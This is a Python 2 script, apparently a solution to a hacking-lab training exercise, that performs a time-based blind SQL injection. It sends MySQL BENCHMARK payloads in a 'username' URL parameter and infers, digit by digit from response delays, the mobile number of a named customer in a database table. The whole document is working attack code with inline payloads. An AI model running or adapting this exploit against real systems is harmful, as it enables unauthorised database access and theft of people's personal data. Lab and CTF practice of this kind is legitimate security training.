import urllib
import time

#A few globals for use throughout
url = 'https://glocken.hacking-lab.com/12001/blindsql_case1/auth_blindsql1/register?action=newPassword&originalURL=null&' 
success = 0
fail = 0

def benchmark_timeout():
	global success, fail
	#I expect this attack to fail, mobile numbers dont often start with ff, I want to find out the timeout for a fail
	test_fail = {"username": "' and if (0<(select count(*) from glocken_emil.customers where name = 'Sandra' and surname = 'Fischer' and mobile like 'ff%'), BENCHMARK(10000000,ENCODE('MSG', 'encode me')),1)\x23"}
	#I expect this attack to succeed, most mobile numbers start with 0 - I've already found that this attack succeeds
	test_success = {"username": "' and if (0<(select count(*) from glocken_emil.customers where name = 'Sandra' and surname = 'Fischer' and mobile like '0%'), BENCHMARK(100000000 ,ENCODE('MSG', 'encode me')),1)" + "\x23"}

	#construct the url
	test_fail = urllib.urlencode(test_fail)
	print "[+] Testing fail [+]"
	fail_url = url + test_fail

	current_time = time.time() 
	f = urllib.urlopen(fail_url)
	fail = time.time() - current_time
	print "[+] Fail took %d [+]" %fail

	test_success = urllib.urlencode(test_success)
	succ_url = url + test_success
        print "[+] Testing success [+]"

	current_time = time.time()	
        f = urllib.urlopen(succ_url)
	success = time.time() - current_time
        print "[+] Success took %d [+]" %success

#Take the current attack string 
def do_attack(current_string):
	global success, fail, url
	current_string = urllib.urlencode(current_string)
	tmp_url = url + current_string

	current_time = time.time()
	f = urllib.urlopen(tmp_url)
	time_taken = time.time() - current_time
	f.close()
	
	print "[Debug] Attack took %d [+]" %time_taken
	#we test if the time taken is longer than the time it took for a known fail
	if(time_taken >= (success-4)):
		return True
	else:
		return False

def main():
	global success, fail, url

	
	final_number = ''
	current_number = '1' 
	numbers = ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ' ') #some numbers have spaces
	benchmark_timeout()
	
	num_index = 5
	index = 0
	while True:
		tmp = current_number 
		tmp += '%'

		current_attack = {"username": "' and if (0<(select count(*) from glocken_emil.customers where name = 'Sandra' and surname = 'Fischer' and mobile like '%s'), BENCHMARK(100000000 ,ENCODE('MSG', 'encode me')),1)\x23" %tmp}
		print "[+] Current mobile is: %s [+]" %final_number
		print "[Debug] %s" %current_attack["username"]		

		if(do_attack(current_attack)):
			print "[debug] Found new value %s" %numbers[num_index]
			final_number += numbers[num_index]
			num_index = (num_index + 1) %len(numbers)
			current_number = final_number + numbers[num_index]
		else:
			num_index = (num_index + 1) % len(numbers)
			current_number = final_number +  numbers[num_index]
	
if __name__ == '__main__':
	main()
